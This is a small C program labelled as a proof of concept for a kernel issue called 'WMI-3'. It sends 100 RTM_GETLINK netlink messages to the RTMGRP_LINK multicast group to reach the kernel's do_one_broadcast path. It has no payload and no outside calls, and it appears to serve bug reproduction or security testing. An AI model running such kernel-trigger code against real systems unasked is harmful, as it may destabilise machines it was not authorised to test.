/*
 * PoC for WMI-3 @ do_one_broadcast - NETLINK_ROUTE broadcast
 *
 * Send RTM (routing/netlink) messages to a multicast group to
 * trigger the broadcast path with kernel listeners present.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <errno.h>

int main(void)
{
    struct sockaddr_nl addr;
    struct {
        struct nlmsghdr nlh;
        struct rtgenmsg g;
    } msg;
    struct iovec iov;
    struct msghdr mh;
    int fd, ret, i;

    printf("=== WMI-3 do_one_broadcast NETLINK_ROUTE PoC ===\n");

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) { perror("socket"); return 1; }

    /* Connect to multicast group 1 (RTMGRP_LINK) */
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = RTMGRP_LINK; /* 1 */
    addr.nl_pid = 0;

    ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("connect"); close(fd); return 1; }

    /* Build an RTM_GETLINK message */
    memset(&msg, 0, sizeof(msg));
    msg.nlh.nlmsg_len = sizeof(msg);
    msg.nlh.nlmsg_type = RTM_GETLINK;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST;
    msg.nlh.nlmsg_seq = 1;
    msg.nlh.nlmsg_pid = 0;
    msg.g.rtgen_family = AF_INET;

    memset(&mh, 0, sizeof(mh));
    iov.iov_base = &msg;
    iov.iov_len = sizeof(msg);
    mh.msg_iov = &iov;
    mh.msg_iovlen = 1;

    printf("Sending RTM_GETLINK broadcasts...\n");
    for (i = 0; i < 100; i++) {
        msg.nlh.nlmsg_seq = i + 1;
        ret = sendmsg(fd, &mh, 0);
        if (ret < 0) {
            if (i == 0) perror("sendmsg");
        }
    }
    printf("Sent %d broadcasts (sendmsg returns errno, expected)\n", i);

    close(fd);
    printf("=== Done ===\n");
    return 0;
}
